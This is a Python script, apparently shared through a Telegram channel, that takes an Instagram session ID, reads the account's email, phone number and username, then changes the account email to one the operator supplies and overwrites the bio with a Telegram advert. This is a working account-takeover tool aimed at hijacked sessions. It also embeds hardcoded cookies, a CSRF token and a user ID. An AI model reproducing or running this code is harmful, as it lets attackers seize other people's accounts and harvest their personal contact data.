import requests
print("""

Telegram : https://t.me/dssqt

< dS > 


""")
sii = input("[?] Enter session id:")
def exitt():
    o = input("[+] Enter To exit")
    exit()
def get_info():
    url = "https://www.instagram.com/accounts/edit/?__a=1"
    headers = {
        "Host": "www.instagram.com",
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "X-IG-App-ID": "936619743392459",
        "X-IG-WWW-Claim": "hmac.AR12Fs18fzvYP9jCne1dhLjB5a8pdPtPh17yqrMQzdvWj5ZS",
        "X-Requested-With": "XMLHttpRequest",
        "Connection": "keep-alive",
        "Referer": "https://www.instagram.com/accounts/edit/",
        'Cookie': 'ig_cb=2; ig_did=16D17E40-38A5-485C-A777-45AD4178960F; mid=X95mggAEAAF_8_wKj0mdSkDvsc3P; shbid=482; shbts=1609071008.2531302; rur=RVA; urlgen="{\"51.36.118.201\": 43766}:1kuTa3:joYKtH2q27Psck3O5RlGsW7nOOc"; csrftoken=3VZnkLZtrhJYfkh3WnD48Mv24rijhm9i; ds_user_id=18324709414; sessionid='+sii,
        "TE": "Trailers"
    }
    try:
        r = requests.get(url,headers=headers)
        e1 = str(r.json()['form_data']['email'])
        e2 = str(r.json()['form_data']['phone_number'])
        e3 = str(r.json()['form_data']['username'])
        print(f"[+] data Info:")
        print("[+] email:"+e1)
        print("[+] phone number:"+e2)
        print("[+] Username:"+e3)
        ch = input("[?] Enter new email:")
        change_info(email=ch,username=e3)
    except:
        print("[X] error session id")
        exitt()
def change_info(email,username):
    url = "https://www.instagram.com/accounts/edit/"
    headers = {
        "Host": "www.instagram.com",
        "User-Agent": "Mozilla/5.0 (X11; Linux i686; rv:78.0) Gecko/20100101 Firefox/78.0",
        "Accept": "*/*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "X-CSRFToken": "3VZnkLZtrhJYfkh3WnD48Mv24rijhm9i",
        "X-Instagram-AJAX": "b10813bd9030",
        "X-IG-App-ID": "936619743392459",
        "X-IG-WWW-Claim": "hmac.AR12Fs18fzvYP9jCne1dhLjB5a8pdPtPh17yqrMQzdvWj5ZS",
        "Content-Type": "application/x-www-form-urlencoded",
        "X-Requested-With": "XMLHttpRequest",
        "Content-Length": "304",
        "Origin": "https://www.instagram.com",
        "Connection": "keep-alive",
        "Referer": "https://www.instagram.com/accounts/edit/",
        'Cookie': 'ig_cb=2; ig_did=16D17E40-38A5-485C-A777-45AD4178960F; mid=X95mggAEAAF_8_wKj0mdSkDvsc3P; shbid=482; shbts=1609071008.2531302; rur=RVA; urlgen="{\"51.36.118.201\": 43766}:1kuTa7:E7q8OFYgWgvOBGAI-ImzCpsck6o"; csrftoken=3VZnkLZtrhJYfkh3WnD48Mv24rijhm9i; ds_user_id=18324709414; sessionid='+sii
    }
    data = {
        "first_name":"",
        "email":email,
        "username":username,
        "biography":"Telegram t.me/dssqt",
        "external_url":"",
        "chaining_enabled": "on"

    }
    r = requests.post(url,headers=headers,data=data)
    if r.text.find('{"status": "ok"}')>=0:
        print("[+] Done Change info ")
        exitt()
    else:
        print("[X] Error ! ")
        exitt()
get_info()
